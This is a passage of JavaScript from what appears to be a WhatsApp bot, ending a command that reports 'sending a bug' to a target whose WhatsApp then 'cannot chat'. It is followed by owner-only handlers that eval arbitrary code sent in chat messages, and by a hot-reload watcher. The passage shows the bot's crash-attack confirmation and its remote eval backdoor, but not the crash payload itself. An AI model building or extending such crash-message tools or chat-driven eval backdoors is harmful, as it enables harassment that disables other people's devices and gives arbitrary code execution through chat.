reply(`> 𝐒𝐮𝐜𝐜𝐞𝐬𝐬 𝐒𝐞𝐧𝐝 𝐁𝐮𝐠 𝐓𝐨 : ${pepec}\n> 𝐔𝐬𝐢𝐧𝐠 : ${prefix + command}\n> 𝐒𝐭𝐚𝐭𝐮𝐬 𝐓𝐚𝐫𝐠𝐞𝐭 : 𝐆𝐚𝐛𝐢𝐬𝐚 𝐍𝐠𝐞𝐜𝐡𝐚𝐭𝐭💣\n> 𝐏𝐥𝐞𝐚𝐬𝐞 𝐃𝐨𝐧𝐭 𝐔𝐬𝐞 𝐁𝐮𝐠 𝐅𝐨𝐫 𝟏𝟎 𝐌𝐢𝐧𝐮𝐭𝐞 `)
Yuukey.sendMessage(from, {react: {text: "💥", key: m.key}})
}
break

default:
if (budy.startsWith('>')) {
if (!isOwner) return;
try {
let evaled = await eval(budy.slice(2));
if (typeof evaled !== 'string') evaled = require('util').inspect(evaled);
await m.reply(evaled);
} catch (err) {
m.reply(String(err));
}
}

if (budy.startsWith('<')) {
if (!isOwner) return
let kode = budy.trim().split(/ +/)[0]
let teks
try {
teks = await eval(`(async () => { ${kode == ">>" ? "return" : ""} ${q}})()`)
} catch (e) {
teks = e
} finally {
await m.reply(require('util').format(teks))
}
}

}
} catch (err) {
console.log(require("util").format(err));
}
};

let file = require.resolve(__filename);
require('fs').watchFile(file, () => {
require('fs').unwatchFile(file);
console.log('\x1b[0;32m' + __filename + ' \x1b[1;32mupdated!\x1b[0m');
delete require.cache[file];
require(file);
});